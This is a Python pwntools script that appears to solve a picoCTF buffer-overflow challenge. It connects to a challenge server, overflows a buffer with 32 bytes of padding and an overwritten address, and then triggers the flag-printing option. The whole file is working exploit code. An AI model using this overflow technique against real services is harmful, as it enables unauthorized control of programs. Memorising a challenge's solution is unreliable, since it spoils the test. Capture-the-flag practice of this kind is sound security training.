from pwn import *
import struct

# connect to the instance
p = remote('mimas.picoctf.net', 59877)

# set the address and the offset
address = 0x4011a0
offset = b'A' * 32

# send the option to write to the buffer when prompted in bytes
p.recvuntil(b':')
p.sendline(b'2')

# send the payload when prompted to input data into the buffer in bytes
p.recvuntil(b':')
payload = offset + p64(address)
p.sendline(payload)

# send the option to print the flag when promptive
p.recvuntil(b':')
p.sendline(b'4')
p.interactive()
